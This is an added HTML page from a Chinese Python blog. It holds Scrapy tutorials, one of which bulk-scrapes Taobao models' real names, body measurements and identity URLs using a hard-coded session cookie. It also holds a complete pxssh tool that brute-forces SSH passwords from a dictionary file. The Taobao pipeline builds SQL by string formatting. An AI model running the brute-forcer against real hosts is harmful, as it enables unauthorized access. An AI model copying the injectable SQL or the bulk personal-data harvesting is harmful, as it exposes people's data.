@@ -1,0 +1,1067 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>  
+	  
+  	Python - 独自一人
+  	
+	</title>
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<link href="atom.xml" rel="alternate" title="独自一人" type="application/atom+xml">
+
+	<link href="asset/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="asset/stylesheets/font-awesome.min.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<script src="asset/javascripts/jquery.min.js"></script>
+	<script src="asset/highlightjs/highlight.pack.js"></script>
+	<link href="asset/highlightjs/styles/solarized_dark.css" media="screen, projection" rel="stylesheet" type="text/css">
+<script>hljs.initHighlightingOnLoad();</script>
+
+	<!--[if lt IE 9]><script src="asset/javascripts/html5.js"></script><![endif]-->
+	<!-- <link href='http://fonts.googleapis.com/css?family=Nunito:400,300,700' rel='stylesheet' type='text/css'> -->
+	<style type="text/css">
+/* latin */
+@font-face {
+  font-family: 'Nunito';
+  font-style: normal;
+  font-weight: 300;
+  src: local('Nunito-Light'), url(asset/font/1TiHc9yag0wq3lDO9cw0voX0hVgzZQUfRDuZrPvH3D8.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+}
+/* latin */
+@font-face {
+  font-family: 'Nunito';
+  font-style: normal;
+  font-weight: 400;
+  src: local('Nunito-Regular'), url(asset/font/6TbRXKWJjpj6V2v_WyRbMX-_kf6ByYO6CLYdB4HQE-Y.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+}
+/* latin */
+@font-face {
+  font-family: 'Nunito';
+  font-style: normal;
+  font-weight: 700;
+  src: local('Nunito-Bold'), url(asset/font/TttUCfJ272GBgSKaOaD7KoX0hVgzZQUfRDuZrPvH3D8.woff2) format('woff2');
+  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2212, U+2215, U+E0FF, U+EFFD, U+F000;
+}
+	</style>
+	
+	<style type="text/css">
+	.container .left-col{ opacity: 1;}
+	#pagenavi a{ font-size: 1.3em;}
+	#pagenavi .next:before{ top: 3px;}
+	#pagenavi .prev:before{ top: 3px;}
+	.container .mid-col .mid-col-container #content .archives .title{ font-size: 1.5em;}
+	.container .mid-col .mid-col-container #content article{ padding: 15px 0px;}
+	#header .subtitle {
+		line-height: 1.2em;
+		padding-top: 8px;
+	}
+	article pre{ background: none; border: none; padding: 0;}
+	article .entry-content{text-align: left;}
+	.share-comment{ padding: 25px 0px; clear: both;}
+	hr{ margin: 20px 0px;border: 0; border-top:solid 1px #ddd;}
+	</style>
+  
+
+</head>
+
+
+<body>
+	<div class="container">
+		<div class="left-col">
+			<div class="intrude-less">
+				<header id="header" class="inner">
+				 
+				 	<div class="profilepic">
+						<img src="https://pic.mylonly.com/2017-05-11-IMG_1164.JPG" style="width:160px;">
+					</div>
+            	
+					
+					<h1><a href="index.html">独自一人</a></h1>
+					<p class="subtitle">独自一人,独自Coding...</p>
+					<nav id="main-nav">
+						<ul class="main">
+						
+						  <li id=""><a target="self" href="index.html">Home</a></li>
+						
+						  <li id=""><a target="_self" href="archives.html">Archives</a></li>
+						
+						</ul>
+					</nav>
+
+					<nav id="sub-nav">
+						<div class="social">
+
+
+
+
+
+
+
+
+
+
+<a target="_blank" class="github" target="_blank" href="https://github.com/mylonly" title="GitHub">GitHub</a>
+<a target="_blank" class="email" href="mailto:root@mylonly.com" title="Email">Email</a>
+
+								
+
+								<a class="rss" href="atom.xml" title="RSS">RSS</a>
+							
+						</div>
+					</nav>
+				</header>				
+			</div>
+		</div>	
+		<div class="mid-col">
+			<div class="mid-col-container"> <div id="content" class="inner">
+<div itemscope itemtype="http://schema.org/Blog">
+
+
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2017-09-12T15:07:09+08:00" itemprop="datePublished">2017/9/12</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='python.html'>Python</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="15052000291680.html" itemprop="url">
+		利用Scrapy-Splash抓取JS动态渲染的网页数据</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<p>随着越来越多的网站开始用JS在客户端浏览器动态渲染网站，导致很多我们需要的数据并不能由原始的html中获取，再加上Scrapy本身并不提供JS渲染解析的功能，通常对这类网站数据的爬取我们一般采用两种方法：</p>
+
+<ol>
+<li>通过分析网站，找到对应数据的接口，模拟接口去获取我们需要的数据(参见<a href="https://www.mylonly.com/14945011244738.html">Scrapy抓取Ajax动态页面</a>),但是一旦该网站的接口隐藏的很深，或者接口的加密过于复杂，此种方法可能就有点行不通了</li>
+<li>借助JS内核，将获取到的含有JS脚本的页面交由JS内核去渲染，最后将渲染后生成的html返回给Scrapy分析，比较常见的WebKit和Scrapy-Splash</li>
+</ol>
+
+<p>本篇文章的目的就是用来介绍如何使用Scrapy-Splash来配合Scrapy抓取动态页面这个问题。</p>
+
+<h3 id="toc_0">准备工作</h3>
+
+<ol>
+<li><p>Docker安装,具体安装步骤参考<a href="https://docs.docker.com/engine/installation/">Docker官网</a></p>
+
+<blockquote>
+<p>为什么要安装Docker?<br/>
+因为Scrapy-Splash使用了<code>Splash HTTP API</code>,所以你需要提供一个Splash实例，而在Docker镜像中已经有现成的Splash实例了，可以很方便的使用。</p>
+</blockquote></li>
+<li><p>Docker镜像源更改,参考<a href="https://ieevee.com/tech/2016/09/28/docker-mirror.html">国内 docker 仓库镜像对比</a></p></li>
+<li><p>安装运行Splash</p>
+
+<pre><code>docker pull scrapinghub/splash   #从docker镜像中拉取splash实例
+docker run -p 8050:8050 scrapinghub/splash  #启动splash实例
+</code></pre></li>
+</ol>
+
+<h3 id="toc_1">Scrapy配置</h3>
+
+<p>在Scrapy项目的setting.py中加入如下内容：</p>
+
+<pre><code class="language-Python">SPLASH_URL = &#39;http://localhost:8050&#39;  
+
+DOWNLOADER_MIDDLEWARES = {
+&#39;scrapy_splash.SplashCookiesMiddleware&#39;: 723,
+&#39;scrapy_splash.SplashMiddleware&#39;: 725,
+&#39;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#39;: 810,
+}
+
+SPIDER_MIDDLEWARES = {
+&#39;scrapy_splash.SplashDeduplicateArgsMiddleware&#39;: 100,
+}
+
+DUPEFILTER_CLASS = &#39;scrapy_splash.SplashAwareDupeFilter&#39;
+
+HTTPCACHE_STORAGE = &#39;scrapy_splash.SplashAwareFSCacheStorage&#39;
+
+</code></pre>
+
+<h3 id="toc_2">实际代码解析</h3>
+
+<p>我们以<a href="http://stock.qq.com/l/stock/ywq/list20150423143546.htm">腾讯证券</a>这个页面为例，腾讯的证券新闻列表是js动态渲染而成</p>
+
+<p>我们直接打开这个链接，然后打开开发者工具，定位到新闻列表处:<br/>
+<img src="https://pic.mylonly.com/2017-09-12-074653.jpg" alt=""/></p>
+
+<p>我们在从network中查看第一次请求的Response时发现，返回的html中该列表页处是空的<br/><br/>
+<img src="https://pic.mylonly.com/2017-09-12-075028.jpg" alt=""/></p>
+
+<p>实际的数据被藏着JS里，加载完成后由JS操作DOM插入完成<br/>
+<img src="https://pic.mylonly.com/2017-09-12-075305.jpg" alt=""/></p>
+
+<p>此处由于实际数据被塞到了一段JS的变量里面，并不是由Ajax调用接口获取的，因此为了避免自己手动去截取js变量，我们便将该页面交给Scrapy-Splash渲染</p>
+
+<pre><code class="language-Python">import scrapy
+from FinancialInfoSpider.items import ArticleItem
+from scrapy_splash import SplashRequest
+from w3lib.html import remove_tags
+import re
+from bs4 import BeautifulSoup
+
+class TencentStockSpider(scrapy.Spider):
+    name = &quot;TencentStock&quot;
+    def start_requests(self):
+        urls = [
+           &#39;http://stock.qq.com/l/stock/ywq/list20150423143546.htm&#39;,
+        ]
+
+        for url in urls:
+            yield SplashRequest(url, self.parse, args={&#39;wait&#39;: 0.5})
+
+    def parse(self,response):
+
+        sel = scrapy.Selector(response)
+        links = sel.xpath(&quot;//div[@class=&#39;qq_main&#39;]//ul[@class=&#39;listInfo&#39;]//li//div[@class=&#39;info&#39;]//h3//a/@href&quot;).extract()
+        requests = []
+        
+        for link in links:
+            request = scrapy.Request(link, callback =self.parse_article)
+            requests.append(request)
+        return requests
+
+    def parse_article(self,response):
+
+        sel = scrapy.Selector(response)
+
+        article = ArticleItem()
+        article[&#39;title&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/h1/text()&#39;).extract()[0]
+        article[&#39;source&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/div/div[1]/span[2]&#39;).xpath(&#39;string(.)&#39;).extract()[0]
+        article[&#39;pub_time&#39;] = sel.xpath(&#39;//*[@id=&quot;Main-Article-QQ&quot;]/div/div[1]/div[1]/div[1]/div/div[1]/span[3]/text()&#39;).extract()[0]
+        
+        html_content = sel.xpath(&#39;//*[@id=&quot;Cnt-Main-Article-QQ&quot;]&#39;).extract()[0]
+        article[&#39;content&#39;] = self.remove_html_tags(html_content)
+        return article
+
+
+    def remove_html_tags(self,html):
+        
+        soup = BeautifulSoup(html)
+        [s.extract() for s in soup(&#39;script&#39;)]
+        [s.extract() for s in soup(&#39;style&#39;)] 
+         
+        content = &#39;&#39;
+        for substring in soup.stripped_strings:
+            content = content + substring
+
+        return content       
+</code></pre>
+
+<p>主要代码就一句，将获取到的页面发送给本地的Splash实例去渲染解析，最后将结果返回给parse函数解析</p>
+
+<pre><code>SplashRequest(url, self.parse, args={&#39;wait&#39;: 0.5})
+</code></pre>
+
+<p>里面用了BeautifulSoup这个库去除了html中得script和style标签，具体用法可以参考这两篇文章:</p>
+
+<p><a href="http://cuiqingcai.com/1319.html">Python爬虫利器二之Beautiful Soup的用法</a><br/>
+<a href="https://my.oschina.net/letiantian/blog/504669">使用BeautifulSoup删除html中的script、注释</a></p>
+
+<p>输出结果:</p>
+
+<p><img src="https://pic.mylonly.com/2017-09-12-080930.jpg" alt=""/></p>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-07-04T19:12:04+08:00" itemprop="datePublished">2016/7/4</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='python.html'>Python</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14945011244738.html" itemprop="url">
+		Scrapy抓取Ajax动态页面</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<blockquote>
+<p>一般来说爬虫类框架抓取Ajax动态页面都是通过一些第三方的webkit库去手动执行html页面中的js代码， 最后将生产的html代码交给spider分析。本篇文章则是通过浏览器提供的Debug工具分析Ajax页面的具体请求内容，找到获取数据的接口url，直接调用该接口获取数据，省去了引入python-webkit库的麻烦，而且由于一般ajax请求的数据都是结构化数据，这样更省去了我们利用xpath解析html的痛苦。</p>
+</blockquote>
+
+<p>这次我们要抓取的网站是<a href="https://mm.taobao.com">淘女郎</a>的页面,全站都是通过Ajax获取数据然后重新渲染生产的。</p>
+
+<p>这篇文章的代码已上传至我的<a href="https://github.com/mylonly/Spiders">Github</a>,由于后面有部分内容并没有提供完整代码，所以贴上地址供各位参考。</p>
+
+<h3 id="toc_0">分析工作</h3>
+
+<p>用Chrome打开淘女郎的首页中的<a href="https://mm.taobao.com/search_tstar_model.htm">美人库</a>，这个页面毫无疑问是会展示所有的模特的信息，同时打开Debug工具，在network选项中查看浏览器发送了哪些请求？</p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_16:11:01.jpg" alt="2016-07-04_16:11:01.jpg"/></p>
+
+<p>在截图的左下角可以看到总共产生了86个请求，那么有什么办法可以快速定位到Ajax请求的链接了，利用Network当中提供的Filter功能，选中Filter，最后选择右边的XHR过滤(XHR时XMLHttpRequest对象，一般Ajax请求的数据都是结构化数据)，这样就剩下了为数不多的几个请求，剩下的就靠我们自己一个一个的检查吧</p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_16:22:18.jpg" alt="2016-07-04_16:22:18.jpg"/></p>
+
+<p>很幸运，通过分析每个接口返回的request和response信息，发现最后一个请求就是我们需要的接口url</p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_16:25:56.jpg" alt="2016-07-04_16:25:56.jpg"/></p>
+
+<p>Request中得参数很简单,根据英文意思就可以猜出意义,由于我们要抓取所有模特的信息，所以不需要定制这些参数，后面直接将这些参数post给接口就行了</p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_16:29:06.jpg" alt="2016-07-04_16:29:06.jpg"/></p>
+
+<p>在Response中可以获得到的有用数据有两个:所有模特信息的列表<code>searchDOList</code>、以及总页数<code>totolPage</code></p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_16:35:05.jpg" alt="2016-07-04_16:35:05.jpg"/></p>
+
+<p>searchDOList列表中得对象都有如上图所示的json格式，它也正是我们需要的模特信息的数据</p>
+
+<h3 id="toc_1">Scrapy编码</h3>
+
+<ol>
+<li><p>定义Item</p>
+
+<pre><code class="language-Python">class tbModelItem(scrapy.Item):
+    avatarUrl = scrapy.Field()
+    cardUrl = scrapy.Field()
+    city = scrapy.Field()
+    height = scrapy.Field()
+    identityUrl = scrapy.Field()
+    modelUrl = scrapy.Field()
+    realName = scrapy.Field()
+    totalFanNum = scrapy.Field()
+    totalFavorNum = scrapy.Field()
+    userId = scrapy.Field()
+    viewFlag = scrapy.Field()
+    weight = scrapy.Field()
+</code></pre>
+
+<p>根据上面的分析得到的json格式，我们可以很轻松的定义出item</p></li>
+<li><p>Spider编写</p>
+
+<pre><code class="language-Python">import urllib2
+import os
+import re
+import codecs
+import json
+import sys
+from scrapy import Spider
+from scrapy.selector import Selector
+from MySpider.items import tbModelItem,tbThumbItem
+from scrapy.http import Request
+from scrapy.http import FormRequest
+from scrapy.utils.response import open_in_browser
+
+reload(sys)
+sys.setdefaultencoding(&#39;utf8&#39;)
+
+class tbmmSpider(Spider):
+    name = &quot;tbmm&quot;
+    allow_domians = [&quot;mm.taobao.com&quot;]
+
+    custom_settings = {
+        &quot;DEFAULT_REQUEST_HEADERS&quot;:{
+            &#39;authority&#39;:&#39;mm.taobao.com&#39;,
+            &#39;accept&#39;:&#39;application/json, text/javascript, */*; q=0.01&#39;,
+            &#39;accept-encoding&#39;:&#39;gzip, deflate&#39;,
+            &#39;accept-language&#39;:&#39;zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4&#39;,
+            &#39;origin&#39;:&#39;https://mm.taobao.com&#39;,
+            &#39;referer&#39;:&#39;https://mm.taobao.com/search_tstar_model.htm?spm=719.1001036.1998606017.2.KDdsmP&#39;,
+            &#39;user-agent&#39;:&#39;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36&#39;,
+            &#39;x-requested-with&#39;:&#39;XMLHttpRequest&#39;,
+            &#39;cookie&#39;:&#39;cna=/oN/DGwUYmYCATFN+mKOnP/h; tracknick=adimtxg; _cc_=Vq8l%2BKCLiw%3D%3D; tg=0; thw=cn; v=0; cookie2=1b2b42f305311a91800c25231d60f65b; t=1d8c593caba8306c5833e5c8c2815f29; _tb_token_=7e6377338dee7; CNZZDATA30064598=cnzz_eid%3D1220334357-1464871305-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464871305; CNZZDATA30063600=cnzz_eid%3D1139262023-1464874171-https%253A%252F%252Fmm.taobao.com%252F%26ntime%3D1464874171; JSESSIONID=8D5A3266F7A73C643C652F9F2DE1CED8; uc1=cookie14=UoWxNejwFlzlcw%3D%3D; l=Ahoatr-5ycJM6M9x2/4hzZdp6so-pZzm; mt=ci%3D-1_0&#39;
+        },
+        &quot;ITEM_PIPELINES&quot;:{
+            &#39;MySpider.pipelines.tbModelPipeline&#39;: 300
+        }
+    } 
+
+    def start_requests(self):
+        url = &quot;https://mm.taobao.com/tstar/search/tstar_model.do?_input_charset=utf-8&quot;
+        requests = []
+        for i in range(1,60):
+            formdata = {&quot;q&quot;:&quot;&quot;,
+                        &quot;viewFlag&quot;:&quot;A&quot;,
+                        &quot;sortType&quot;:&quot;default&quot;,
+                        &quot;searchStyle&quot;:&quot;&quot;,
+                        &quot;searchRegion&quot;:&quot;city:&quot;,
+                        &quot;searchFansNum&quot;:&quot;&quot;,
+                        &quot;currentPage&quot;:str(i),
+                        &quot;pageSize&quot;:&quot;100&quot;}
+            request = FormRequest(url,callback=self.parse_model,formdata=formdata)
+            requests.append(request)
+        return requests
+
+    def parse_model(self,response):
+        jsonBody = json.loads(response.body.decode(&#39;gbk&#39;).encode(&#39;utf-8&#39;))
+        models = jsonBody[&#39;data&#39;][&#39;searchDOList&#39;]
+        modelItems = []
+        for dict in models:
+            modelItem = tbModelItem()
+            modelItem[&#39;avatarUrl&#39;] = dict[&#39;avatarUrl&#39;]
+            modelItem[&#39;cardUrl&#39;] = dict[&#39;cardUrl&#39;]
+            modelItem[&#39;city&#39;] = dict[&#39;city&#39;]
+            modelItem[&#39;height&#39;] = dict[&#39;height&#39;]
+            modelItem[&#39;identityUrl&#39;] = dict[&#39;identityUrl&#39;]
+            modelItem[&#39;modelUrl&#39;] = dict[&#39;modelUrl&#39;]
+            modelItem[&#39;realName&#39;] = dict[&#39;realName&#39;]
+            modelItem[&#39;totalFanNum&#39;] = dict[&#39;totalFanNum&#39;]
+            modelItem[&#39;totalFavorNum&#39;] = dict[&#39;totalFavorNum&#39;]
+            modelItem[&#39;userId&#39;] = dict[&#39;userId&#39;]
+            modelItem[&#39;viewFlag&#39;] = dict[&#39;viewFlag&#39;]
+            modelItem[&#39;weight&#39;] = dict[&#39;weight&#39;]
+            modelItems.append(modelItem)
+        return modelItems  
+</code></pre>
+
+<p>代码不长，一点一点来分析:</p>
+
+<ol>
+<li>由于分析这个页面并不需要递归遍历网页，所以就不要crawlSpider了，只继承最简单的spider</li>
+<li>custome_setting可用于自定义每个spider的设置，而setting.py中的都是全局属性的，当你的scrapy工程里有多个spider的时候这个custom_setting就显得很有用了</li>
+<li>ITEM_PIPELINES，自定义管道模块，当item获取到数据后会调用你指定的管道处理命令，这个后面会贴上代码，因为这个不影响本文的内容，数据的处理可以因人而异。</li>
+<li>依然重写start_request,带上必要的参数请求我们分析得到的借口url，这里我省了一个懒，只遍历了前60页的数据，各位当然可以先调用1次借口确定总的页数(totalPage)之后再写这个for循环。</li>
+<li>parse函数里利用json库解析了返回来得数据，赋值给item的相应字段</li>
+</ol></li>
+<li><p>数据后续处理</p>
+
+<p>数据处理也就是我上面配置ITEM_PIPELINES的目的，这里，我将获取到的item数据存储到了本地的mysql数据中，各位也可以通过FEED_URL参数直接输出json格式文本文件</p>
+
+<pre><code class="language-Python">import MySQLdb
+
+class tbModelPipeline(object):
+    def process_item(self,item,spider):
+        db = MySQLdb.connect(&quot;localhost&quot;,&quot;用户名&quot;,&quot;密码&quot;,&quot;spider&quot;)
+        cursor = db.cursor()
+        db.set_character_set(&#39;utf8&#39;)
+        cursor.execute(&#39;SET NAMES utf8;&#39;)
+        cursor.execute(&#39;SET CHARACTER SET utf8;&#39;)
+        cursor.execute(&#39;SET character_set_connection=utf8;&#39;)
+
+        sql =&quot;INSERT INTO tb_model(user_id,avatar_url,card_url,city,height,identity_url,model_url,real_name,total_fan_num,total_favor_num,view_flag,weight)\
+                      VALUES(&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;)&quot;%(item[&#39;userId&#39;],item[&#39;avatarUrl&#39;],item[&#39;cardUrl&#39;],item[&#39;city&#39;],item[&#39;height&#39;],item[&#39;identityUrl&#39;],\
+                      item[&#39;modelUrl&#39;],item[&#39;realName&#39;],item[&#39;totalFanNum&#39;],item[&#39;totalFavorNum&#39;],item[&#39;viewFlag&#39;],item[&#39;weight&#39;])
+        try:
+                print sql
+                cursor.execute(sql)
+                db.commit()
+        except MySQLdb.Error,e:
+                print &quot;Mysql Error %d: %s&quot; % (e.args[0], e.args[1])
+        db.close()
+        return item
+</code></pre></li>
+</ol>
+
+<h3 id="toc_2">更重要的内容</h3>
+
+<p>获取所有的淘女郎的基本信息并不是<a href="https://mm.taobao.com">淘女郎</a>这个网站的全部内容，还有一些更有意思的数据,比如:</p>
+
+<p>点击进入模特的页面之后发现左侧会有有个相册选项卡，点击后右边出现了各种相册，而每个相册里面都是各种各样的模特照片</p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_17:04:22.jpg" alt="2016-07-04_17:04:22.jpg"/></p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_17:04:49.jpg" alt="2016-07-04_17:04:49.jpg"/></p>
+
+<p>通过network的分析，这些页面的数据通通都是Ajax请求获得的，具体的接口如下:</p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_17:09:51.jpg" alt="2016-07-04_17:09:51.jpg"/></p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_17:10:16.jpg" alt="2016-07-04_17:10:16.jpg"/></p>
+
+<ol>
+<li><p>获取相册列表的接口是一个GET请求，其中只有一个很重要的user_id，而这个user_id在上面拿去模特的基本信息已经拿到了，还有个page参数用于标识获取的是第几页数据(由于这个是第一页，并没有在url中显现出来，可以通过返回的html中包含的totalPage元素获得)不过这个接口的返回就不是标准的json格式了，而是一段html，这时候又到了利用scrapy中提供的强大的xpath功能了</p>
+
+<pre><code class="language-Python">def parse_album(self,response):
+   sel = Selector(response)
+   tbThumbItems = []
+   thumb_url_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/@href&quot;).extract()       
+   thumb_name_list = sel.xpath(&quot;//div[@class=&#39;mm-photo-cell-middle&#39;]//h4//a/text()&quot;).extract()
+   user_id = response.meta[&#39;user_id&#39;]
+   for i in range(0,len(thumb_url_list)-1):
+       thumbItem = tbThumbItem()
+       thumbItem[&#39;thumb_name&#39;] = thumb_name_list[i].replace(&#39;\r\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;)
+       thumbItem[&#39;thumb_url&#39;] = thumb_url_list[i]
+       thumbItem[&#39;thumb_userId&#39;] = str(user_id)
+       temp = self.urldecode(thumbItem[&#39;thumb_url&#39;])
+       thumbItem[&#39;thumb_id&#39;] = temp[&#39;album_id&#39;][0]
+       tbThumbItems.append(thumbItem)
+   return tbThumbItems
+</code></pre></li>
+<li><p>获取相册里照片的接口就是一个完全的json格式的接口了,其中参数包括我们已经拿到的user_id以及album_id，page的最大范围totalPage依然可以通过第一次返回的response中的totalPage字段获得</p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_17:25:23.jpg" alt="2016-07-04_17:25:23.jpg"/></p>
+
+<p><img src="https://pic.mylonly.com/2016-07-04_17:25:46.jpg" alt="2016-07-04_17:25:46.jpg"/></p></li>
+</ol>
+
+<h3 id="toc_3">总结</h3>
+
+<ol>
+<li>这种通过分析Ajax接口直接调用获取原始数据应该是效率最高的抓取数据方式，但并不是所有的Ajax页面都适用，还是要具体对待，比如我们上面获取相册列表当中就要去分析html来获得相册的基本信息。</li>
+<li>获取相册和相册里的照片列表写的比较简略，基本没展示什么代码，这样写是有原因的:一个是因为我已经挂了代码的链接,而且后面这两部分的原理和我主要讲的第一部分获取模特信息的原理基本类似，不想花太多的篇幅花在这种重复的内容上，另外一个我希望想掌握Scrapy的同学能在明白我第一部分的讲解下自己能顺利完成后面的工作，遇到不明白的时候可以看看我Github上的源码，看看有什么不对的地方，只有自己写一遍才能掌握，这是编程界的硬道理。</li>
+</ol>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-06-24T19:12:26+08:00" itemprop="datePublished">2016/6/24</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='python.html'>Python</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14945011465578.html" itemprop="url">
+		利用pxssh暴力破解ssh密码</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<blockquote>
+<p><mark>关于pxssh</mark><br/>
+pxssh 是一个包含了pexpect库的专用脚本,它已经预先为我们写好了login(),logout()和prompt()等函数直接与SSH交互。</p>
+</blockquote>
+
+<h4 id="toc_0">利用pxssh的login函数判断密码是否正确</h4>
+
+<p>由于pxssh.login()函数执行失败会抛出异常，因此我们可以利用try...catch来捕获相应的异常来判断密码是否正确。（PS:其中的connection_lock.release()是信号量得释放操作）</p>
+
+<pre><code class="language-Python">def connect(host,user,password):
+    try:
+        session = pxssh.pxssh()
+        session.login(host,user,password)
+        print(&#39;[+]Password Found:&#39;+password)
+    except Exception,e:
+        print (&#39;[-] Error Connecting:&#39;+str(e))
+    finally:
+        connection_lock.release()
+</code></pre>
+
+<h4 id="toc_1">多线程和信号量</h4>
+
+<p>由于我们准备从一个庞大的字典文件的读取密码，我们决定利用多线程来同时处理多个密码登陆操作用来加快速度。</p>
+
+<pre><code class="language-Python">password_file = open(password,&#39;r&#39;)
+for line in password_file:
+        thread = threading.Thread(target=connect,args=(host,user,password))
+        thread.start()
+</code></pre>
+
+<p>可是像上面的代码,如果password_file是个巨大的密码文件，就为同时产生过多的线程，很容易造成服务器无法响应，为了控制同时存在的线程数量，我们这里采用threading中的BoundedSemaphore来控制最大连接数，也就是最多的允许线程数量,讲上面的代码改成如下这样:</p>
+
+<pre><code class="language-Python">maxConnections = 5
+connection_lock = threading.BoundedSemaphore(maxConnections)
+password_file = open(password,&#39;r&#39;)
+for line in password_file:
+   password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
+   connection_lock.acquire()
+   print(&#39;[-] Testing password:&#39;+str(password))
+   thread = threading.Thread(target=connect,args=(host,user,password))
+   thread.start()
+</code></pre>
+
+<p>最大连接数被设置为5，在每个thread启动时注册一个信号量，在connect函数结束时注销这个信号量，这样同时存在的线程数量就被控制为5个。</p>
+
+<h4 id="toc_2">测试结果</h4>
+
+<p><img src="https://pic.mylonly.com/2016-06-29_14667836697742.jpg" alt="2016-06-29_14667836697742.jpg"/><br/>
+字典文件可以自己生成，或者网上找一些常用字典文件</p>
+
+<h4 id="toc_3">完整代码</h4>
+
+<pre><code class="language-Python">from pexpect import pxssh
+import threading
+import optparse
+import time
+
+maxConnections = 5
+connection_lock = threading.BoundedSemaphore(maxConnections)
+
+def send_command(child,cmd):
+    child.sendline(cmd)
+    child.prompt()
+    print(child.before)
+
+def connect(host,user,password):
+    try:
+        session = pxssh.pxssh()
+        session.login(host,user,password)
+        print(&#39;[+]Password Found:&#39;+password)
+    except Exception,e:
+        print (&#39;[-] Error Connecting:&#39;+str(e))
+    finally:
+        connection_lock.release()
+
+def main():
+    
+    parse = optparse.OptionParser(&#39;Usage %prog &#39;+ \
+        &#39;-H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&#39;)
+    parse.add_option(&#39;-H&#39;,dest=&#39;host&#39;,type=&#39;string&#39;,help=&#39;specify target host&#39;)
+    parse.add_option(&#39;-u&#39;,dest=&#39;user&#39;,type=&#39;string&#39;,help=&#39;specify username&#39;)
+    parse.add_option(&#39;-F&#39;,dest=&#39;password&#39;,type=&#39;string&#39;,help=&#39;specify password file&#39;)
+    (options,args) = parse.parse_args()
+
+    host = options.host
+    user = options.user
+    password = options.password
+
+    password_file = open(password,&#39;r&#39;)
+
+    for line in password_file:
+        password = line.strip(&#39;\r&#39;).strip(&#39;\n&#39;)
+        connection_lock.acquire()
+        print(&#39;[-] Testing password:&#39;+str(password))
+        thread = threading.Thread(target=connect,args=(host,user,password))
+        thread.start()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+
+</code></pre>
+
+
+			
+			
+		</div>
+
+	</article>
+ 
+	<article class="post" itemprop="blogPost" itemscope itemtype="http://schema.org/BlogPosting">
+		<div class="meta">
+			<div class="date">
+				<time datetime="2016-06-24T19:11:42+08:00" itemprop="datePublished">2016/6/24</time>
+			</div>
+			<div class="tags">posted in 
+			
+			    <a class='category' href='python.html'>Python</a>&nbsp;
+			 
+			</div>
+		</div>
+		<h1 class="title" itemprop="name"><a href="14945011027951.html" itemprop="url">
+		Python利用Pexpect模拟ssh交互</a></h1>
+		<div class="entry-content" itemprop="articleBody">
+			
+			<blockquote>
+<p><mark>关于Pexpect</mark><br/>
+Pexpect 是 Don Libes 的 Expect 语言的一个 Python 实现，是一个用来启动子程序，并使用正则表达式对程序输出做出特定响应，以此实现与其自动交互的 Python 模块。 Pexpect 的使用范围很广，可以用来实现与 ssh、ftp 、telnet 等程序的自动交互；可以用来自动复制软件安装包并在不同机器自动安装；还可以用来实现软件测试中与命令行交互的自动化。</p>
+</blockquote>
+
+<h5 id="toc_0">本文利用到的Pexpect的类和方法</h5>
+
+<ol>
+<li><p><code>spawn()</code>类:</p>
+
+<pre><code class="language-Python">class spawn:
